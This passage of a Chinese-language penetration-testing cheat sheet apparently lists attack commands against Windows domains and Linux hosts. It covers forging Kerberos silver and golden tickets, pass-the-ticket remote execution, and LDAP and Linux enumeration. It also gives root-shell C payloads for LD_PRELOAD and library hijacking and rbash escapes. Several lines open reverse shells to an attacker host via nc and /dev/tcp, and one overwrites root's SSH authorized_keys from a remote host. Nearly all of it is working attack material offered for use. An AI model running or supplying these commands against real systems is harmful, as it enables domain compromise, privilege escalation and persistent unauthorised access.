<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><h6 id="导入示例"><a href="#导入示例" class="headerlink" title="导入示例"></a>导入示例</h6><h6 id="使用-NTLM-生成-TGS"><a href="#使用-NTLM-生成-TGS" class="headerlink" title="使用 NTLM 生成 TGS"></a>使用 NTLM 生成 TGS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python ticketer.py -nthash &lt;NTLMHASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -spn &lt;SPN&gt;  &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-aesKey-生成-TGS"><a href="#使用-aesKey-生成-TGS" class="headerlink" title="使用 aesKey 生成 TGS"></a>使用 aesKey 生成 TGS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python ticketer.py -aesKey &lt;KEY&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -spn &lt;SPN&gt;  &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="导入到本地票据凭证"><a href="#导入到本地票据凭证" class="headerlink" title="导入到本地票据凭证"></a>导入到本地票据凭证</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br></code></pre></td></tr></table></figure>

<h6 id="使用-TGT-执行远程命令-1"><a href="#使用-TGT-执行远程命令-1" class="headerlink" title="使用 TGT 执行远程命令"></a>使用 TGT 执行远程命令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br></code></pre></td></tr></table></figure>

<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><h6 id="使用-NTLM-生成-TGS-1"><a href="#使用-NTLM-生成-TGS-1" class="headerlink" title="使用 NTLM 生成 TGS"></a>使用 NTLM 生成 TGS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /rc4:&lt;NTLMHASH&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-AES-128-位密钥生成-TGS"><a href="#使用-AES-128-位密钥生成-TGS" class="headerlink" title="使用 AES 128 位密钥生成 TGS"></a>使用 AES 128 位密钥生成 TGS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes128:&lt;KEY&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-AES-256-位密钥生成-TGS（更安全的加密，可能更隐蔽，因为默认使用它）"><a href="#使用-AES-256-位密钥生成-TGS（更安全的加密，可能更隐蔽，因为默认使用它）" class="headerlink" title="使用 AES 256 位密钥生成 TGS（更安全的加密，可能更隐蔽，因为默认使用它）"></a>使用 AES 256 位密钥生成 TGS（更安全的加密，可能更隐蔽，因为默认使用它）</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes256:&lt;KEY&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-Mimikatz-注入-TGS"><a href="#使用-Mimikatz-注入-TGS" class="headerlink" title="使用 Mimikatz 注入 TGS"></a>使用 Mimikatz 注入 TGS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::ptt &lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="Rubeus-的例子"><a href="#Rubeus-的例子" class="headerlink" title="Rubeus 的例子"></a>Rubeus 的例子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="在远程主机上执行CMD"><a href="#在远程主机上执行CMD" class="headerlink" title="在远程主机上执行CMD"></a>在远程主机上执行CMD</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd<br></code></pre></td></tr></table></figure>

<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><h6 id="导入示例-1"><a href="#导入示例-1" class="headerlink" title="导入示例"></a>导入示例</h6><h6 id="使用-NTLM-生成-TGT"><a href="#使用-NTLM-生成-TGT" class="headerlink" title="使用 NTLM 生成 TGT"></a>使用 NTLM 生成 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt;  &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-aesKey-生成-TGT"><a href="#使用-aesKey-生成-TGT" class="headerlink" title="使用 aesKey 生成 TGT"></a>使用 aesKey 生成 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python ticketer.py -aesKey &lt;KEY&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt;  &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="设置-Impacket-使用的-TGT-1"><a href="#设置-Impacket-使用的-TGT-1" class="headerlink" title="设置 Impacket 使用的 TGT"></a>设置 Impacket 使用的 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br></code></pre></td></tr></table></figure>

<h6 id="使用-TGT-执行远程命令-2"><a href="#使用-TGT-执行远程命令-2" class="headerlink" title="使用 TGT 执行远程命令"></a>使用 TGT 执行远程命令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br></code></pre></td></tr></table></figure>

<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><h6 id="使用-NTLM-生成-TGT-1"><a href="#使用-NTLM-生成-TGT-1" class="headerlink" title="使用 NTLM 生成 TGT"></a>使用 NTLM 生成 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /rc4:&lt;KRBTGT_NTLM_HASH&gt; /user:&lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-AES-128-位密钥生成-TGT"><a href="#使用-AES-128-位密钥生成-TGT" class="headerlink" title="使用 AES 128 位密钥生成 TGT"></a>使用 AES 128 位密钥生成 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes128:&lt;KEY&gt; /user:&lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-AES-256-位密钥生成-TGT（更安全的加密，可能更隐蔽，因为默认使用它）"><a href="#使用-AES-256-位密钥生成-TGT（更安全的加密，可能更隐蔽，因为默认使用它）" class="headerlink" title="使用 AES 256 位密钥生成 TGT（更安全的加密，可能更隐蔽，因为默认使用它）"></a>使用 AES 256 位密钥生成 TGT（更安全的加密，可能更隐蔽，因为默认使用它）</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /aes256:&lt;KEY&gt; /user:&lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-Mimikatz-注入-TGT"><a href="#使用-Mimikatz-注入-TGT" class="headerlink" title="使用 Mimikatz 注入 TGT"></a>使用 Mimikatz 注入 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::ptt &lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="Rubeus的例子"><a href="#Rubeus的例子" class="headerlink" title="Rubeus的例子"></a>Rubeus的例子</h5><h6 id="用-Rubeus-注入票据-1"><a href="#用-Rubeus-注入票据-1" class="headerlink" title="用 Rubeus 注入票据"></a>用 Rubeus 注入票据</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="在远程主机上执行CMD-1"><a href="#在远程主机上执行CMD-1" class="headerlink" title="在远程主机上执行CMD"></a>在远程主机上执行CMD</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd<br></code></pre></td></tr></table></figure>

<h6 id="从密码获取NTLM"><a href="#从密码获取NTLM" class="headerlink" title="从密码获取NTLM"></a>从密码获取NTLM</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python -c <span class="hljs-string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;&lt;PASSWORD&gt;&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="LDAPsearch"><a href="#LDAPsearch" class="headerlink" title="LDAPsearch"></a>LDAPsearch</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">ldapsearch -H ldap:<span class="hljs-comment">//&lt;RHOST&gt; -x -s base -b &#x27;&#x27; &quot;(objectClass=*)&quot; &quot;*&quot; +</span><br>ldapsearch -H ldaps:<span class="hljs-comment">//&lt;RHOST&gt;:636/ -x -s base -b &#x27;&#x27; &quot;(objectClass=*)&quot; &quot;*&quot; +</span><br>ldapsearch -x -H ldap:<span class="hljs-comment">//&lt;RHOST&gt; -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=&lt;RHOST&gt;,DC=local&quot;</span><br>ldapsearch -x -H ldap:<span class="hljs-comment">//&lt;RHOST&gt; -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=&lt;RHOST&gt;,DC=local&quot; | grep descr -A 3 -B 3</span><br>ldapsearch -H ldap:<span class="hljs-comment">//&lt;RHOST&gt; -D &lt;USERNAME&gt; -w &quot;&lt;PASSWORD&gt;&quot; -b &quot;CN=Users,DC=&lt;RHOST&gt;,DC=local&quot; | grep info</span><br></code></pre></td></tr></table></figure>

<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><h5 id="基本-Linux-枚举"><a href="#基本-Linux-枚举" class="headerlink" title="基本 Linux 枚举"></a>基本 Linux 枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">id<br>sudo -l<br>uname -a<br>env<br>cat /etc/hosts<br>cat /etc/fstab<br>cat /etc/passwd<br>ss -tulpn<br>ps -auxf<br>ls -lahv<br>ls -R /home<br>ls -la /opt<br>capsh --print<br></code></pre></td></tr></table></figure>

<h5 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -user &lt;USERNAME&gt; -ls <span class="hljs-number">2</span>&gt;/dev/null<br>find / -user &lt;USERNAME&gt; -ls <span class="hljs-number">2</span>&gt;/dev/null | grep -v proc <span class="hljs-number">2</span>&gt;/dev/null<br>find / -group &lt;GROUP&gt; <span class="hljs-number">2</span>&gt;/dev/null<br>find / -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;/dev/null | xargs ls -la<br>find / -type f -user root -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;/dev/null<br>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; <span class="hljs-number">2</span>&gt; /dev/null<br>find / -cmin <span class="hljs-number">-60</span>    <span class="hljs-comment">// 查找在过去60分钟内更改的文件</span><br>find / -amin <span class="hljs-number">-60</span>    <span class="hljs-comment">// 查找过去60分钟内的文件访问</span><br>find ./ -type f -exec grep --color=always -i -I <span class="hljs-string">&#x27;password&#x27;</span> &#123;&#125; \;    <span class="hljs-comment">// search for passwords</span><br></code></pre></td></tr></table></figure>

<h5 id="grep-获取密码"><a href="#grep-获取密码" class="headerlink" title="grep 获取密码"></a>grep 获取密码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">grep -R db_passwd<br>grep -roiE <span class="hljs-string">&quot;password.&#123;20&#125;&quot;</span><br>grep -oiE <span class="hljs-string">&quot;password.&#123;20&#125;&quot;</span> /etc<span class="hljs-comment">/*.conf</span><br><span class="hljs-comment">grep -v &quot;^[#;]&quot; /PATH/TO/FILE | grep -v &quot;^$&quot;    // grep for passwords like &quot;DBPassword:&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="APACHE2"><a href="#APACHE2" class="headerlink" title="APACHE2"></a>APACHE2</h5><h6 id="使用-apache2-二进制读取文件的第一行"><a href="#使用-apache2-二进制读取文件的第一行" class="headerlink" title="使用 apache2 二进制读取文件的第一行"></a>使用 apache2 二进制读取文件的第一行</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo /usr/sbin/apache2 -f &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&#x27;apt::Update::Pre-Invoke &#123;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f&quot;&#125;;&#x27;</span> &gt; /etc/apt/apt.conf.d/&lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ARIA2C"><a href="#ARIA2C" class="headerlink" title="ARIA2C"></a>ARIA2C</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">aria2c -d /root/.ssh/ -o authorized_keys <span class="hljs-string">&quot;http://&lt;LHOST&gt;/authorized_keys&quot;</span> --allow-overwrite=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>

<h5 id="Bash-调试模式"><a href="#Bash-调试模式" class="headerlink" title="Bash 调试模式"></a>Bash 调试模式</h5><ul>
<li><ul>
<li>Bash &lt;4.4<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">env -i SHELLOPTS=xtrace PS4=<span class="hljs-string">&#x27;$(chmod +s /bin/bash)&#x27;</span> /usr/local/bin/&lt;BINARY&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="bash-函数"><a href="#bash-函数" class="headerlink" title="bash 函数"></a>bash 函数</h5><ul>
<li><ul>
<li>Bash &lt;4.2-048<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">function /usr/sbin/&lt;BINARY&gt; &#123; /bin/bash -p; &#125;<br>export -f /usr/sbin/&lt;BINARY&gt;<br>/usr/sbin/&lt;BINARY&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="LD-预加载"><a href="#LD-预加载" class="headerlink" title="LD_预加载"></a>LD_预加载</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
</blockquote>
<h6 id="shell-c"><a href="#shell-c" class="headerlink" title="shell.c"></a>shell.c</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    setresuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(<span class="hljs-number">0</span>);<br>setuid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -o &lt;SHARED_OBJECT&gt;.so &lt;FILE&gt;.c -shared -FPIC -nostartfiles <br></code></pre></td></tr></table></figure>

<h6 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/&lt;SHARED_OBJECT&gt;.so &lt;BINARY&gt;<br></code></pre></td></tr></table></figure>

<h5 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h5><h6 id="获取有关Libraries的信息"><a href="#获取有关Libraries的信息" class="headerlink" title="获取有关Libraries的信息"></a>获取有关Libraries的信息</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ldd /PATH/TO/BINARY/&lt;BINARY&gt;<br></code></pre></td></tr></table></figure>

<h6 id="shell-c-1"><a href="#shell-c-1" class="headerlink" title="shell.c"></a>shell.c</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">hijack</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack</span><span class="hljs-params">()</span> &#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>);<br>    setresuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -o &lt;LIBRARY&gt;.so.&lt;NUMBER&gt; -shared -fPIC &lt;FILE&gt;.c<br></code></pre></td></tr></table></figure>

<h6 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升"></a>权限提升</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/&lt;LIBRARY&gt;.so.&lt;NUMBER&gt; &lt;BINARY&gt;<br></code></pre></td></tr></table></figure>

<h5 id="logrotten"><a href="#logrotten" class="headerlink" title="logrotten"></a>logrotten</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/whotwagner/logrotten">https://github.com/whotwagner/logrotten</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> [ `id -u` -eq <span class="hljs-number">0</span> ]; then ( /bin/sh -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> ); fi<br></code></pre></td></tr></table></figure>

<h6 id="如果在-logrotate-cfg-中设置了“create”选项"><a href="#如果在-logrotate-cfg-中设置了“create”选项" class="headerlink" title="如果在 logrotate.cfg 中设置了“create”选项"></a>如果在 logrotate.cfg 中设置了“create”选项</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./logrotten -p ./payloadfile /tmp/<span class="hljs-built_in">log</span>/pwnme.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<h6 id="如果在-logrotate-cfg-中设置了“compress”选项"><a href="#如果在-logrotate-cfg-中设置了“compress”选项" class="headerlink" title="如果在 logrotate.cfg 中设置了“compress”选项"></a>如果在 logrotate.cfg 中设置了“compress”选项</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./logrotten -p ./payloadfile -c -s <span class="hljs-number">4</span> /tmp/<span class="hljs-built_in">log</span>/pwnme.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<h5 id="路径变量劫持"><a href="#路径变量劫持" class="headerlink" title="路径变量劫持"></a>路径变量劫持</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br>find / -writable <span class="hljs-number">2</span>&gt;/dev/null | cut -d <span class="hljs-string">&quot;/&quot;</span> -f <span class="hljs-number">2</span>,<span class="hljs-number">3</span> | grep -v proc | sort -u<br>export PATH=$(pwd):$PATH<br></code></pre></td></tr></table></figure>

<h5 id="PHP7-2"><a href="#PHP7-2" class="headerlink" title="PHP7.2"></a>PHP7.2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">/usr/bin/php7<span class="hljs-number">.2</span> -r <span class="hljs-string">&quot;pcntl_exec(&#x27;/bin/bash&#x27;, [&#x27;-p&#x27;]);&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h4><h5 id="使用-PATH-变量进行突破"><a href="#使用-PATH-变量进行突破" class="headerlink" title="使用 $PATH 变量进行突破"></a>使用 $PATH 变量进行突破</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></code></pre></td></tr></table></figure>

<h5 id="使用less进行突破"><a href="#使用less进行突破" class="headerlink" title="使用less进行突破"></a>使用less进行突破</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">less /etc/profile<br>!/bin/sh<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">VISUAL=<span class="hljs-string">&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot;</span> less /etc/profile<br>v<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">less /etc/profile<br>v:shell<br></code></pre></td></tr></table></figure>

<h5 id="使用-scp-进行突破"><a href="#使用-scp-进行突破" class="headerlink" title="使用 scp 进行突破"></a>使用 scp 进行突破</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">TF=$(mktemp)<br>echo <span class="hljs-string">&#x27;sh 0&lt;&amp;2 1&gt;&amp;2&#x27;</span> &gt; $TF<br>chmod +x <span class="hljs-string">&quot;$TF&quot;</span><br>scp -S $TF x y:<br></code></pre></td></tr></table></figure>

<h5 id="使用-vi-进行突破"><a href="#使用-vi-进行突破" class="headerlink" title="使用 vi 进行突破"></a>使用 vi 进行突破</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/null<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">vi<br>:<span class="hljs-built_in">set</span> shell=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure>

<h5 id="使用-SSH-命令执行进行突破"><a href="#使用-SSH-命令执行进行突破" class="headerlink" title="使用 SSH 命令执行进行突破"></a>使用 SSH 命令执行进行突破</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh &lt;USERNAME&gt;@&lt;RHOST&gt; -t sh<br>ssh &lt;USERNAME&gt;@&lt;RHOST&gt; -t /bin/sh<br>ssh &lt;USERNAME&gt;@&lt;RHOST&gt; -t <span class="hljs-string">&quot;/bin/bash --no-profile&quot;</span><br></code></pre></td></tr></table></figure>

